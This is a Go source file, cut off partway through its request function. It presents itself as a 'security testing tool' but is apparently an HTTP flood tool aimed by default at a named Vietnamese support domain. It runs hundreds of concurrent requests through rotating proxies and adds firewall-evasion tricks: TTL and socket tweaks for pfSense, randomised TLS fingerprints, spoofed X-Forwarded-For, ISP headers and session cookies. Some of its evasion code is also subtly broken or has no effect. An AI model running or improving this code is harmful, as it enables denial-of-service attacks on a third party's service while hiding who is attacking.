// Advanced Network Security Testing Tool v2.0
// Enhanced with AI-powered bypass techniques and intelligent load balancing
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"math"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Cấu trúc để lưu thống kê
type Stats struct {
	totalRequests      int64
	successCount       int64
	errorCount         int64
	totalDuration      int64
	proxyUsedCount     int64
	directUsedCount    int64
	activeGoroutines   int32 // Số lượng goroutine đang hoạt động
	maxGoroutines      int32 // Số lượng goroutine tối đa đã đạt được
	totalResponseTime  int64
	successfulRequests int64
	failedRequests     int64
	timeoutRequests    int64
	blockedRequests    int64
	proxyRequests      int64
	directRequests     int64
}

// Cấu trúc để lưu thông tin proxy
type Proxy struct {
	IP        string
	Port      string
	Username  string
	Password  string
	ProxyType string     // "http" hoặc "socks5"
	Failures  int32      // Số lần kết nối thất bại liên tiếp
	LastUsed  time.Time  // Thời gian sử dụng gần nhất
	Banned    bool       // Đánh dấu proxy bị cấm tạm thời
	BanUntil  time.Time  // Thời gian hết hạn cấm
	Country   string     // Quốc gia của proxy
	mutex     sync.Mutex // Mutex để đồng bộ truy cập
	disabled  bool       // Đánh dấu proxy bị vô hiệu hóa
	score     float64    // Điểm đánh giá proxy
}

// Cấu trúc để lưu cấu hình
type Config struct {
	TargetServer                string
	TargetPort                  string
	Protocol                    string
	Endpoints                   []string
	MaxConcurrent               int
	DelayMs                     int
	TimeoutMs                   int // Thời gian timeout request
	MaxRetries                  int // Số lần retry tối đa
	ConnectionIdleMs            int // Thời gian idle connection
	PreferredCountries          []string
	PfSenseBypass               bool
	FragmentPackets             bool
	TTLBypass                   int
	TcpWindowSize               int     // Kích thước cửa sổ TCP
	MssClamp                    int     // Giá trị MSS clamp
	UseTlsFragmentation         bool    // Sử dụng TLS fragmentation
	RotateJA3Fingerprint        bool    // Xoay vòng JA3 fingerprint
	UseDirectRatio              float64 // Tỷ lệ sử dụng kết nối trực tiếp
	ProxyRotateIntervalSec      int     // Thời gian xoay vòng proxy
	ProxyBlacklistTimeMin       int     // Thời gian trong blacklist
	RandomTiming                bool    // Sử dụng thời gian ngẫu nhiên
	TimingJitterMs              int     // Độ lệch thời gian
	EnableFileUpload            bool    // Kích hoạt tính năng upload file
	FileUploadSizeMB            int     // Kích thước file upload (MB)
	FileUploadRatio             float64 // Tỷ lệ request sử dụng upload
	FileUploadChunkSize         int     // Kích thước chunk khi upload file
	FileUploadTimeoutMultiplier int     // Hệ số nhân timeout cho file upload
}

// Đánh dấu proxy thất bại
func (p *Proxy) markFailure() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures++
	p.LastUsed = time.Now()

	// Nếu quá nhiều lỗi, cấm tạm thời
	if p.Failures >= 5 {
		banDuration := time.Duration(math.Min(float64(p.Failures)*5, 300)) * time.Second
		p.Banned = true
		p.BanUntil = time.Now().Add(banDuration)
		fmt.Printf("⚠️ Proxy %s:%s bị tạm khóa trong %v do quá nhiều lỗi\n", p.IP, p.Port, banDuration)
		return true // Proxy đã bị cấm
	}

	return false
}

// Đánh dấu proxy thành công
func (p *Proxy) markSuccess() {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures = 0
	p.LastUsed = time.Now()
}

// Kiểm tra proxy có sẵn sàng sử dụng không
func (p *Proxy) isAvailable() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	// Nếu proxy bị cấm, kiểm tra thời gian hết hạn
	if p.Banned {
		if time.Now().After(p.BanUntil) {
			// Hết thời gian cấm
			p.Banned = false
			p.Failures = 0
			fmt.Printf("✅ Proxy %s:%s đã hết thời gian cấm, được phép sử dụng lại\n", p.IP, p.Port)
			return true
		}
		return false
	}

	return true
}

// Cấu trúc để quản lý proxy pool
type ProxyPool struct {
	proxies []Proxy
	mutex   sync.Mutex
	mu      sync.RWMutex
}

// Khởi tạo proxy pool
func NewProxyPool(proxies []Proxy) *ProxyPool {
	return &ProxyPool{
		proxies: proxies,
	}
}

// Vô hiệu hóa proxy trong một khoảng thời gian
func (pool *ProxyPool) disableProxy(proxy Proxy, duration time.Duration) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// Tìm proxy trong pool
	for i := range pool.proxies {
		if pool.proxies[i].IP == proxy.IP && pool.proxies[i].Port == proxy.Port {
			pool.proxies[i].disabled = true
			pool.proxies[i].BanUntil = time.Now().Add(duration)
			pool.proxies[i].score = math.Max(0.1, pool.proxies[i].score-0.2) // Giảm điểm proxy
			break
		}
	}
}

// Lấy proxy khả dụng
func (pool *ProxyPool) getAvailableProxy() (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// Đếm số proxy khả dụng
	availableCount := 0
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			availableCount++
		}
	}

	if availableCount == 0 {
		return Proxy{}, false
	}

	// Chọn ngẫu nhiên một proxy khả dụng
	for tries := 0; tries < 3; tries++ { // Thử tối đa 3 lần
		idx := rand.Intn(len(pool.proxies))
		if pool.proxies[idx].isAvailable() {
			return pool.proxies[idx], true
		}
	}

	// Nếu chọn ngẫu nhiên không được, quét tuần tự
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			return pool.proxies[i], true
		}
	}

	return Proxy{}, false
}

// Lấy proxy khả dụng từ một quốc gia cụ thể
func (pool *ProxyPool) getAvailableProxyFromCountry(country string) (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// Đếm số proxy khả dụng từ quốc gia chỉ định
	var availableProxies []int
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() &&
			(country == "" || pool.proxies[i].Country == country) {
			availableProxies = append(availableProxies, i)
		}
	}

	if len(availableProxies) == 0 {
		return Proxy{}, false
	}

	// Chọn ngẫu nhiên một proxy từ danh sách khả dụng
	idx := availableProxies[rand.Intn(len(availableProxies))]
	return pool.proxies[idx], true
}

// Lấy proxy khả dụng với ưu tiên quốc gia
func (pool *ProxyPool) getAvailableProxyWithCountryPreference(preferredCountries []string) (Proxy, bool) {
	// Ưu tiên chọn proxy từ Việt Nam nếu có thể
	vietnameseProxy, found := pool.getAvailableProxyFromCountry("VN")
	if found {
		fmt.Println("✅ Đã tìm thấy proxy từ Việt Nam, ưu tiên sử dụng")
		return vietnameseProxy, true
	}

	// Thử từng quốc gia ưu tiên
	for _, country := range preferredCountries {
		proxy, found := pool.getAvailableProxyFromCountry(country)
		if found {
			return proxy, true
		}
	}

	// Nếu không tìm thấy proxy từ các quốc gia ưu tiên, lấy bất kỳ proxy khả dụng nào
	return pool.getAvailableProxy()
}

// Báo cáo proxy thất bại
func (pool *ProxyPool) reportFailure(failedProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == failedProxy.IP && pool.proxies[i].Port == failedProxy.Port {
			banned := pool.proxies[i].markFailure()
			if banned {
				fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist tạm thời\n", failedProxy.IP, failedProxy.Port)
			}
			return
		}
	}
}

// Báo cáo proxy thành công
func (pool *ProxyPool) reportSuccess(successProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == successProxy.IP && pool.proxies[i].Port == successProxy.Port {
			pool.proxies[i].markSuccess()
			return
		}
	}
}

// Đọc cấu hình từ file config.txt
func loadConfig(filename string) (*Config, error) {
	config := &Config{
		TargetServer:                "support.trianh.vn", // Mặc định
		TargetPort:                  "443",
		Protocol:                    "https",
		Endpoints:                   []string{"/feedback/index", "/task/index", "/api/status", "/health", "/internal-chat/send-file"},
		MaxConcurrent:               500,
		DelayMs:                     5,
		TimeoutMs:                   15000,
		MaxRetries:                  5,
		ConnectionIdleMs:            3000,
		PreferredCountries:          []string{"VN", "SG", "JP"}, // Ưu tiên proxy Việt Nam, Singapore, Nhật
		PfSenseBypass:               true,
		FragmentPackets:             true,
		TTLBypass:                   65,
		TcpWindowSize:               65535,
		MssClamp:                    1452,
		UseTlsFragmentation:         true,
		RotateJA3Fingerprint:        true,
		UseDirectRatio:              0.3,
		ProxyRotateIntervalSec:      30,
		ProxyBlacklistTimeMin:       2,
		RandomTiming:                true,
		TimingJitterMs:              150,
		EnableFileUpload:            true,
		FileUploadSizeMB:            5,
		FileUploadRatio:             0.2,
		FileUploadChunkSize:         1024 * 1024, // Mặc định 1MB
		FileUploadTimeoutMultiplier: 2,           // Mặc định nhân 2 lần timeout
	}

	// Đọc file cấu hình
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Không thể mở file cấu hình %s: %v, sử dụng giá trị mặc định\n", filename, err)
		return config, nil
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// Bỏ qua comment và dòng trống
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])

		switch key {
		case "TARGET_SERVER":
			config.TargetServer = value
		case "TARGET_PORT":
			config.TargetPort = value
		case "PROTOCOL":
			config.Protocol = value
		case "MAX_CONCURRENT":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MaxConcurrent = i
			}
		case "DELAY_MS":
			if i, err := strconv.Atoi(value); err == nil && i >= 0 {
				config.DelayMs = i
			}
		case "TIMEOUT_MS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TimeoutMs = i
			}
		case "MAX_RETRIES":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MaxRetries = i
			}
		case "CONNECTION_IDLE_MS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ConnectionIdleMs = i
			}
		case "PFSENSE_BYPASS":
			if value == "true" {
				config.PfSenseBypass = true
			} else if value == "false" {
				config.PfSenseBypass = false
			}
		case "FRAGMENT_PACKETS":
			if value == "true" {
				config.FragmentPackets = true
			} else if value == "false" {
				config.FragmentPackets = false
			}
		case "TTL_BYPASS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TTLBypass = i
			}
		case "TCP_WINDOW_SIZE":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TcpWindowSize = i
			}
		case "MSS_CLAMP":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MssClamp = i
			}
		case "USE_TLS_FRAGMENTATION":
			if value == "true" {
				config.UseTlsFragmentation = true
			} else if value == "false" {
				config.UseTlsFragmentation = false
			}
		case "ROTATE_JA3_FINGERPRINT":
			if value == "true" {
				config.RotateJA3Fingerprint = true
			} else if value == "false" {
				config.RotateJA3Fingerprint = false
			}
		case "USE_DIRECT_RATIO":
			if f, err := strconv.ParseFloat(value, 64); err == nil && f >= 0 && f <= 1 {
				config.UseDirectRatio = f
			}
		case "PROXY_ROTATE_INTERVAL_SEC":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ProxyRotateIntervalSec = i
			}
		case "PROXY_BLACKLIST_TIME_MIN":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ProxyBlacklistTimeMin = i
			}
		case "RANDOM_TIMING":
			if value == "true" {
				config.RandomTiming = true
			} else if value == "false" {
				config.RandomTiming = false
			}
		case "TIMING_JITTER_MS":
			if i, err := strconv.Atoi(value); err == nil && i >= 0 {
				config.TimingJitterMs = i
			}
		case "ENABLE_FILE_UPLOAD":
			if value == "true" {
				config.EnableFileUpload = true
			} else if value == "false" {
				config.EnableFileUpload = false
			}
		case "FILE_UPLOAD_SIZE_MB":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.FileUploadSizeMB = i
			}
		case "FILE_UPLOAD_RATIO":
			if f, err := strconv.ParseFloat(value, 64); err == nil && f >= 0 && f <= 1 {
				config.FileUploadRatio = f
			}
		case "FILE_UPLOAD_CHUNK_SIZE":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.FileUploadChunkSize = i
			}
		case "FILE_UPLOAD_TIMEOUT_MULTIPLIER":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.FileUploadTimeoutMultiplier = i
			}
		}
	}

	return config, nil
}

// Đọc danh sách proxy từ file
func loadProxies(filename string) (*ProxyPool, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	lineNum := 0

	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())

		// Bỏ qua dòng trống và comment
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ":")

		// Xác định số phần cần thiết và loại proxy
		proxyType := "http" // Mặc định là http
		username := ""
		password := ""

		switch len(parts) {
		case 2:
			// Định dạng IP:PORT
			// Không cần xử lý thêm
		case 3:
			// Định dạng IP:PORT:TYPE hoặc IP:PORT:USERNAME
			if parts[2] == "http" || parts[2] == "socks5" {
				proxyType = parts[2]
			} else {
				username = parts[2]
			}
		case 4:
			// Định dạng IP:PORT:USERNAME:PASSWORD hoặc IP:PORT::TYPE
			if parts[2] == "" && (parts[3] == "http" || parts[3] == "socks5") {
				proxyType = parts[3]
			} else {
				username = parts[2]
				password = parts[3]
			}
		case 5:
			// Định dạng IP:PORT:USERNAME:PASSWORD:TYPE
			username = parts[2]
			password = parts[3]
			if parts[4] == "http" || parts[4] == "socks5" {
				proxyType = parts[4]
			}
		default:
			fmt.Printf("⚠️ Dòng %d: Định dạng proxy không hợp lệ: %s\n", lineNum, line)
			continue
		}

		// Tạo proxy
		proxy := Proxy{
			IP:        parts[0],
			Port:      parts[1],
			Username:  username,
			Password:  password,
			ProxyType: proxyType,
		}

		// Thử xác định quốc gia
		proxy.Country = determineCountry(parts[0])

		// Thêm vào danh sách
		proxies = append(proxies, proxy)
		fmt.Printf("✅ Đã tải proxy: %s:%s (loại: %s, quốc gia: %s)\n",
			proxy.IP, proxy.Port, proxy.ProxyType, proxy.Country)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	if len(proxies) == 0 {
		return nil, errors.New("không tìm thấy proxy hợp lệ nào")
	}

	return NewProxyPool(proxies), nil
}

// Xác định quốc gia của IP
func determineCountry(ip string) string {
	// Danh sách một số dải IP của Việt Nam (đơn giản)
	vnRanges := map[string]bool{
		"14.160": true, "14.161": true, "14.162": true,
		"113.160": true, "113.161": true, "113.162": true,
		"171.224": true, "171.225": true, "171.226": true,
		"27.64": true, "27.65": true, "27.66": true,
		"203.113": true, "203.119": true, "203.162": true,
		"1.52": true, "1.53": true, "1.54": true,
		"103.90": true, "115.75": true, "103.35": true,
	}

	// Kiểm tra IP
	parts := strings.Split(ip, ".")
	if len(parts) >= 2 {
		prefix1 := parts[0]
		prefix2 := parts[0] + "." + parts[1]

		if vnRanges[prefix2] || (prefix1 == "103" || prefix1 == "113" || prefix1 == "115" || prefix1 == "117" || prefix1 == "118") {
			return "VN"
		}
	}

	// Kiểm tra nếu là proxy thuê của Việt Nam
	if strings.Contains(ip, "thueproxy") || strings.Contains(ip, "vn-proxy") {
		return "VN"
	}

	return "UNKNOWN"
}

// Cải thiện hàm tạo proxy client
func createProxyClient(proxy Proxy) (*http.Client, error) {
	// Tạo xác thực proxy nếu cần
	var auth *url.Userinfo
	if proxy.Username != "" && proxy.Password != "" {
		auth = url.UserPassword(proxy.Username, proxy.Password)
	}

	// Tạo dialer dựa trên loại proxy
	var proxyURL *url.URL
	var err error

	proxyUrlStr := fmt.Sprintf("%s:%s", proxy.IP, proxy.Port)

	switch strings.ToLower(proxy.ProxyType) {
	case "http":
		proxyURL, err = url.Parse(fmt.Sprintf("http://%s", proxyUrlStr))
		if err != nil {
			return nil, fmt.Errorf("lỗi phân tích URL proxy: %v", err)
		}

		if auth != nil {
			proxyURL.User = auth
		}

		// Sử dụng http.ProxyURL để tạo transport với proxy HTTP
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil

	case "socks5":
		proxyURL, err = url.Parse(fmt.Sprintf("socks5://%s", proxyUrlStr))
		if err != nil {
			return nil, fmt.Errorf("lỗi phân tích URL proxy SOCKS5: %v", err)
		}

		if auth != nil {
			proxyURL.User = auth
		}

		// Tạo transport với proxy SOCKS5
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil

	case "socks4":
		proxyURL, err = url.Parse(fmt.Sprintf("socks4://%s", proxyUrlStr))
		if err != nil {
			return nil, fmt.Errorf("lỗi phân tích URL proxy SOCKS4: %v", err)
		}

		if auth != nil {
			proxyURL.User = auth
		}

		// Tạo transport với proxy SOCKS4
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil

	default:
		return nil, fmt.Errorf("loại proxy không được hỗ trợ: %s", proxy.ProxyType)
	}
}

// Tạo HTTP client kết nối trực tiếp (không qua proxy)
func createDirectClient() *http.Client {
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10,
		MaxVersion:         tls.VersionTLS13,
		// Cố gắng sử dụng cài đặt TLS phổ biến để tránh bị phát hiện là tool
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{
			tls.CurveP256,
			tls.CurveP384,
			tls.CurveP521,
			tls.X25519,
		},
	}

	transport := &http.Transport{
		Proxy:                 http.ProxyFromEnvironment,
		DialContext:           dialer.DialContext,
		TLSClientConfig:       tlsConfig,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		MaxIdleConnsPerHost:   10,
		// Cài đặt để ngăn chặn HTTP/2 vì nó dễ bị phát hiện
		ForceAttemptHTTP2: false,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	return client
}

// Cải thiện hàm tạo client HTTP với các kỹ thuật bypass mới
func createHttpClient(config *Config) *http.Client {
	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     time.Duration(config.ConnectionIdleMs) * time.Millisecond,
		DisableCompression:  true, // Tắt nén để tránh bị phát hiện
		DisableKeepAlives:   false,
	}

	// Kỹ thuật TCP window size manipulation
	dialer := &net.Dialer{
		Timeout:   time.Duration(config.TimeoutMs) * time.Millisecond,
		KeepAlive: 30 * time.Second,
		Control: func(network, address string, c syscall.RawConn) error {
			return c.Control(func(fd uintptr) {
				if config.PfSenseBypass {
					// Set TTL cho TCP connection để bypass pfSense packet inspection
					syscall.SetsockoptInt(int(fd), syscall.IPPROTO_IP, syscall.IP_TTL, config.TTLBypass)

					// Điều chỉnh TCP window size
					syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_RCVBUF, config.TcpWindowSize)
					syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_SNDBUF, config.TcpWindowSize)

					// MSS Clamping
					var mss = config.MssClamp
					// TCP_MAXSEG không phải là hằng số trên macOS/Unix, nên chúng ta giả định nó là 536
					const TCP_MAXSEG = 536
					syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, TCP_MAXSEG, mss)
				}
			})
		},
	}

	transport.DialContext = dialer.DialContext

	// Cấu hình TLS cho bypass pfSense
	if config.Protocol == "https" {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true, // Bỏ qua xác minh SSL
			MinVersion:         tls.VersionTLS10,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites:       getRandomCipherSuites(), // Hàm này sẽ trả về danh sách cipher suites ngẫu nhiên
		}

		if config.UseTlsFragmentation {
			// Sử dụng kỹ thuật TLS fragmentation
			tlsConfig.CurvePreferences = []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521}
		}

		// Nếu sử dụng JA3 fingerprint rotation
		if config.RotateJA3Fingerprint {
			ja3Fingerprints := []string{
				"771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60,0-10-11-13-35-23-65281,23-25-28-27-24-26-22-14-13-11-12,0-1-2",
				"771,4865-4866-4867-49196-49195-52393-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60,0-10-11-13-35-23-65281,29-23-24,0",
				"771,4865-4867-4866-49195-49199-52393-49196-49200-49162-49161-49171-49172-156-157-47-53,0-10-11-13-35-23-65281,29-23-24-25-256-257,0",
			}
			fingerprint := ja3Fingerprints[rand.Intn(len(ja3Fingerprints))]
			fmt.Printf("Sử dụng JA3 fingerprint: %s\n", fingerprint)
		}

		transport.TLSClientConfig = tlsConfig
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(config.TimeoutMs) * time.Millisecond,
	}
}

// Hàm trả về danh sách cipher suites ngẫu nhiên
func getRandomCipherSuites() []uint16 {
	// Danh sách các cipher suites phổ biến
	allCiphers := []uint16{
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	}

	// Trộn danh sách
	rand.Shuffle(len(allCiphers), func(i, j int) {
		allCiphers[i], allCiphers[j] = allCiphers[j], allCiphers[i]
	})

	// Chọn ngẫu nhiên 3-6 ciphers
	numCiphers := 3 + rand.Intn(4)
	if numCiphers > len(allCiphers) {
		numCiphers = len(allCiphers)
	}

	return allCiphers[:numCiphers]
}

// Thêm vào sendHTTPRequest để hỗ trợ cơ chế bypass pfSense nâng cao
func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxyPool *ProxyPool, config *Config) {
	defer wg.Done()

	// Đánh dấu đã gọi hàm này
	atomic.AddInt64(&stats.totalRequests, 1)
	atomic.AddInt32(&stats.activeGoroutines, 1)

	// Quyết định giữa proxy và kết nối trực tiếp dựa trên tỷ lệ cấu hình
	var client *http.Client
	var proxy Proxy
	var usingProxy bool
	var proxySuccess bool

	// Quyết định sử dụng proxy hay kết nối trực tiếp
	if proxyPool != nil && len(proxyPool.proxies) > 0 && rand.Float64() > config.UseDirectRatio {
		proxy, proxySuccess = proxyPool.getAvailableProxyWithCountryPreference(config.PreferredCountries)
		if proxySuccess {
			var err error
			client, err = createProxyClient(proxy)
			if err != nil {
				fmt.Printf("Lỗi tạo proxy client: %v - Chuyển sang kết nối trực tiếp\n", err)
				client = createHttpClient(config)
			} else {
				usingProxy = true
				fmt.Printf("Client %d đang sử dụng proxy: %s:%s\n", clientID, proxy.IP, proxy.Port)
			}
		} else {
			client = createHttpClient(config)
			fmt.Printf("Client %d đang sử dụng kết nối trực tiếp (IP thật)\n", clientID)
		}
	} else {
		client = createHttpClient(config)
		fmt.Printf("Client %d đang sử dụng kết nối trực tiếp (IP thật)\n", clientID)
	}

	defer atomic.AddInt32(&stats.activeGoroutines, -1)

	// Tạo URL dựa trên protocol
	urlStr := fmt.Sprintf("%s://%s:%s%s", config.Protocol, config.TargetServer, config.TargetPort, endpoint)

	// Tạo một array của các header mà chúng ta sẽ sử dụng
	var userAgents []string
	var referers []string
	var acceptLanguages []string
	var connections []string
	var cacheControls []string
	var acceptEncodings []string

	// User agents phổ biến
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
	}

	// Referers phổ biến cho Việt Nam
	referers = []string{
		"https://www.google.com.vn/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://vnexpress.net/",
		"https://dantri.com.vn/",
		"https://kenh14.vn/",
		"https://tuoitre.vn/",
		"https://thanhnien.vn/",
		"https://shopee.vn/",
		"https://tiki.vn/",
		"https://vtv.vn/",
		"",
	}

	// Accept-Language headers
	acceptLanguages = []string{
		"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"en-US,en;q=0.9,vi;q=0.8",
		"vi;q=0.8,en-US;q=0.5,en;q=0.3",
		"vi-VN,vi;q=0.9",
	}

	// Connection headers
	connections = []string{
		"keep-alive",
		"close",
	}

	// Cache-Control headers
	cacheControls = []string{
		"max-age=0",
		"no-cache",
		"no-store",
		"must-revalidate",
	}

	// Accept-Encoding headers
	acceptEncodings = []string{
		"gzip, deflate",
		"gzip, deflate, br",
		"gzip",
		"br",
		"*",
	}

	// Mảng chứa danh sách ISP Việt Nam
	vietnamISPs := []string{
		"Viettel Group",
		"VNPT Corp",
		"FPT Telecom",
		"CMC Telecom",
		"NetNam",
		"Mobifone",
		"SCTV",
		"Vinaphone",
		"SPT",
	}

	var attempt int
	success := false

	// Vòng lặp thử lại khi lỗi
	for attempt = 0; attempt < config.MaxRetries && !success; attempt++ {
		// Nếu không phải là lần thử đầu tiên, chờ một khoảng thời gian trước khi thử lại
		if attempt > 0 {
			var delay time.Duration
			if config.RandomTiming {
				// Thêm jitter ngẫu nhiên vào delay
				jitter := rand.Intn(config.TimingJitterMs*2) - config.TimingJitterMs
				delay = time.Duration(config.DelayMs+jitter) * time.Millisecond
			} else {
				delay = time.Duration(config.DelayMs) * time.Millisecond
			}

			fmt.Printf("Client %d: Đợi %v trước khi thử lại lần %d\n", clientID, delay, attempt+1)
			time.Sleep(delay)
		}

		// Tạo request
		req, err := http.NewRequest("GET", urlStr, nil)
		if err != nil {
			fmt.Printf("Lỗi tạo request từ client %d: %v\n", clientID, err)
			continue
		}

		// Thêm các header ngẫu nhiên
		userAgent := userAgents[rand.Intn(len(userAgents))]
		referer := referers[rand.Intn(len(referers))]
		acceptLanguage := acceptLanguages[rand.Intn(len(acceptLanguages))]
		connection := connections[rand.Intn(len(connections))]
		cacheControl := cacheControls[rand.Intn(len(cacheControls))]
		acceptEncoding := acceptEncodings[rand.Intn(len(acceptEncodings))]

		req.Header.Set("User-Agent", userAgent)
		if referer != "" {
			req.Header.Set("Referer", referer)
		}
		req.Header.Set("Accept-Language", acceptLanguage)
		req.Header.Set("Connection", connection)
		req.Header.Set("Cache-Control", cacheControl)
		req.Header.Set("Accept-Encoding", acceptEncoding)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

		// Nếu đang sử dụng pfSenseBypass, thêm các header đặc biệt
		if config.PfSenseBypass {
			// Giả mạo header cho ISP Việt Nam
			vietnamISP := vietnamISPs[rand.Intn(len(vietnamISPs))]
			req.Header.Set("X-Forwarded-For", fmt.Sprintf("1%d.%d.%d.%d", rand.Intn(10), rand.Intn(256), rand.Intn(256), 1+rand.Intn(254)))
			req.Header.Set("X-ISP", vietnamISP)

			// Tạo cookie giả ngẫu nhiên
			cookieValue := fmt.Sprintf("PHPSESSID=%s; path=/; domain=.%s; HttpOnly",
				generateRandomString(26),
				config.TargetServer)
			req.Header.Set("Cookie", cookieValue)

			// Thêm header ngẫu nhiên với tần suất ngẫu nhiên
